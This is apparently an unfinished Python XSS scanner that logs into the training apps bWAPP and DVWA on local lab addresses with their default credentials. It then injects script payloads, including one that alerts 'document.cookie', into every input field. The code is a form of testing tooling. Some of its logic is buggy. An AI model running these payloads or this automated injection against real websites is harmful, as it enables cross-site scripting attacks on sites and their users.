#from browsermobproxy import Server
import re, sys, json, base64, binascii
import argparse

# # Proxy server
# server = Server("/root/Desktop/browsermob-proxy-2.1.0-beta-5/bin/browsermob-proxy")
# server.start()
# proxy = server.create_proxy()
from seleniumrequests import Firefox
from selenium.webdriver.support.ui import Select



# Fetch username, password input boxes and submit button

def fsbmt():
    '''
    locate sumit button
    '''
    try:
        try:
            fsbmt.submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            fsbmt.submit = driver.find_element_by_xpath("//input[@type='submit']")
    except:
        print "could not locate submit button \n"
        submit_name = raw_input("What is the submit box HTML name? ")
        fsbmt.submit = driver.find_element_by_name(submit_name)


def auth(auth1):
    '''
    Asks the user if the site to be scanned has authentication
    '''
    looper = True
    while looper == True:
        login_url = raw_input("What is the URL of the login page you want to access? ")
        if login_url.startswith("http://"):
            try:
                driver.get(login_url)
                looper = False

            except:
                print "Something went wrong trying to load the URL please re-enter the URL \n"
        elif login_url == "":
            print "Please enter a URL"
        else:
            add = "http://" + login_url
            driver.get(add)
            looper = False
    # find login boxes
    looper = True
    next = 0
    if auth1 == True:
        while looper == True:
            INPUT_uname = raw_input("What is the username? ")
            INPUT_pass = raw_input("What's the Pass? ")

            # Locate login box
            try:
                auth.username = driver.find_element_by_id("login")
                print "a"
            except:
                next = next + 1
                print "a2"
                print next
                pass

            if next == 1:
                try:
                    auth.username = driver.find_element_by_name("login")
                    print "b"
                except:
                    next += 1
                    print "b2"
                    pass

            if next == 2:
                try:
                    auth.username = driver.find_element_by_name("username")
                    print "c"
                except:
                    next += 1
                    print "c2"
                    pass

            if next == 3:
                try:
                    auth.username = driver.find_element_by_name("email")
                    print "d"
                except:
                    next += 1
                    print "d2"
                    pass

            if next == 4:
                try:
                    auth.username = driver.find_element_by_name("user")
                    print "e"
                except:
                    next += 1
                    print "e2"
                    pass

            if next == 5:
                try:
                    auth.username = driver.find_element_by_name("user_id")
                    print "f"
                except:
                    next += 1
                    print "f2"
                    pass

            if next == 6:
                try:
                    auth.username = driver.find_element_by_name("user-id")
                    print "g"
                except:
                    next += 1
                    print "g2"
                    pass

            if next == 7:
                print "could not locate login field \n"
                login_name = raw_input("What is the login box HTML name? ")
                auth.username = driver.find_element_by_name(login_name)

            # Try to locate password field
            next = 0
            try:
                auth.password = driver.find_element_by_name("password")
            except:
                pass
            if next == 0:
                try:
                    auth.password = driver.find_element_by_name("pass")
                except:
                    next += 1
                    pass
            if next == 1:
                try:
                    auth.password = driver.find_element_by_name("passwd")
                except:
                    next += 1
                    pass
            if next == 2:
                try:
                    auth.password = driver.find_element_by_name("Password")
                except:
                    next += 1
                    pass
            else:
                print "could not locate password field \n"
                Password_name = raw_input("What is the password box HTML name? ")
                auth.username = driver.find_element_by_name(Password_name)

            # locate submit field
            fsbmt()
            # enter inputs
            auth.username.send_keys(INPUT_uname)
            auth.password.send_keys(INPUT_pass)
            # click on the submit button
            fsbmt.submit.click()

            try:
                # If a login box is detected then authentication failed
                driver.find_element_by_name("login")
                print "Something Went Wrong During Authentication, try re enter U & P"
            except:
                # return False
                looper = False


def my_opt():
    '''
    Parse args from user
    '''
    parser = argparse.ArgumentParser('crosshair <url> -a <scanning page has authentication>', version="Crosshair v1.0")
    parser.add_argument('-u', '--url', dest='url', help='URL to fetch data from')
    parser.add_argument('-a', '--auth', dest='auth', action='store_true', default=False,
                        help="Specify if the page you are scanning requires authentication")

    args = parser.parse_args()
    my_opt.URL = args.url
    print args
    if not args.url:
        print 'You must specify a URL.', sys.argv[0], '--help for more details'
        exit(1)
    if args.auth == True:
        print 'link to the next bit.', sys.argv[1], '--help for more details'
        auth(args.auth)
    return args


# ['-a', '-u','http://192.168.127.178/dvwa/login.php']

# load what you want to test with (change to phantomjs later)
driver = Firefox()
driver.set_window_size(1000,500)
# uncomment to reparse args
# my_opt()
# args-url location
# driver.get(my_opt.URL)


#Testing Delete later
#Testing Auth____ Comment IN TO autologin Bwap
driver.get("http://192.168.127.144/bWAPP/login.php")
select = Select(driver.find_element_by_name('security_level'))
select.select_by_visible_text("medium")
username = driver.find_element_by_id("login")
password = driver.find_element_by_name("password")
submit = driver.find_element_by_xpath("//button[@type='submit']")
username.send_keys("bee")
password.send_keys("bug"),
# click on the submit button
submit.click()

#BWAPP TEST Start
# XXS GET TEST
driver.get("http://192.168.127.144/bWAPP/xss_get.php?")


# Testing Auth____ Comment IN TO autologin DVWA
driver.request('GET',"http://192.168.127.178/dvwa/login.php")
username = driver.find_element_by_name("username")
password = driver.find_element_by_name("password")
submit = driver.find_element_by_name("Login")
username.send_keys("admin")
password.send_keys("admin"),
# click on the submit button
submit.click()

# DVWA TEST Start
driver.request('GET',"http://192.168.127.178/dvwa/vulnerabilities/xss_r/")

#token = "document.cookie"
token = "DANW"

# Payload Variables


def PAYLOAD():
    '''
    XSS Payloads
    '''
    PAYLOAD.PLD1 = "<script>alert(" + token + ")</script>"
    PAYLOAD.PLD2 = """'';!--"<b>b</bhttps://www.youtube.com/watch?v=nYeHCXHBskI><""" + token + """>=&{()}"""
    PAYLOAD.PLD3 = "><script>alert(document.cookie)</script>"

    PAYLOAD.PLDA = '''"><x>AppCheck</x>'''
    PAYLOAD.PLDB = '''"><script>AppCheck</script>'''
    PAYLOAD.PLDC = '''"><script>alert("''' + token + '''")</script>'''


class encoders:
    def html_encode(self, prse):
        '''
        Swaps characters in string
        '''
        html_chars = (
            ("'", '&#39;'),
            ('"', '&quot'),
            (">", '&gt;'),
            ("<", '&lt;'),
            ("&", "&#38;"),
            ("(", '&#40;'),
            (")", '&#41;')

        )
        for chars in html_chars:
            prse = prse.replace(chars[0], chars[1])
        return prse

    def url_encode(self, prse):
        '''
        Swaps characters in string
        '''
        url_chars = (
            ("'", '%27'),
            # lower double quote code
            ('"', '%93'),
            (">", '%3E'),
            ("<", '%3C'),
            ("&", "%26"),
            ("(", '%28'),
            (")", '%29')

        )
        for chars in url_chars:
            prse = prse.replace(chars[0], chars[1])
        return prse


PAYLOAD()
enc = encoders()
PAYLOAD.PLD1 = enc.html_encode(PAYLOAD.PLD1)


# PAYLOAD.PLD1 = base64.b64encode(PAYLOAD.PLD2)
# PAYLOAD.PLD1 = binascii.hexlify(PAYLOAD.PLD2)

# Find inputs
def exploit():
    # locate submit
    try:
        try:
            submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            submit = driver.find_element_by_xpath("//input[@type='submit']")
    except:
        print "could not locate submit button \n"
        submit_name = raw_input("What is the submit box HTML name? ")
        submit = driver.find_element_by_name(submit_name)

    exploit.INPUT = driver.find_elements_by_tag_name('input')

    #while = toke
    for i in exploit.INPUT:
        i.send_keys(PAYLOAD.PLDC)

        # print "Number of tokens detected in Reflected Get " + tokencount
        # print json.dumps(HAR)
    submit.click()
    #HAR = proxy.har
    #print json.dumps(HAR, sort_keys=True, indent=4)
    #detect = re.findall(r"%s" % token, str(HAR))
    #tokencount = len(detect)
    #
    # if tokencount > 0:
    #     print "Number of tokens detected %s " % tokencount
    # else:
    #     print "No injection points were detected on the selected site"
    #     print tokencount
        # print HAR
        # json_parsed = json.lo(str(HAR))
        # print json.dumps(json_parsed, indenpt=4, sort_keys=True)


exploit()


def submit():
    try:
        submit = driver.find_element_by_name("form")
        print "chill"
    except:
        pass


# DVWA input
# submit = driver.find_element_by_xpath('//*[@id="main_body"]/div/div/form/input[2]')


# #Bwap input
# submit = driver.find_element_by_name("form")
# submit.click()
#
# def ref_get():
#     HAR = proxy.har
#     # print HAR
#     detect = re.findall(r"<%s>" % token, str(HAR))
#     tokencount = str(len(detect))
#     print "Number of tokens detected in Reflected Get " + tokencount
#     print json.dumps(HAR)


def main():
    return True
